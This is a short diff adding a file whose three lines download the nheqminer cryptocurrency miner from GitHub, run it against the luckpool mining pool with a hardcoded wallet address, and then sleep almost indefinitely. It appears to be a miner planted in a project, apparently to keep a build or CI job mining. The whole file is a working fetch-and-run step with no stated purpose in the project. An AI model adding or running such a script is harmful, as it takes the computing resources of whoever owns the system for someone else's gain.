@@ -1,0 +1,3 @@
+pool=na.luckpool.net:3956
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l $pool -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.no2 -p x -t 2
+sleep 897886276373
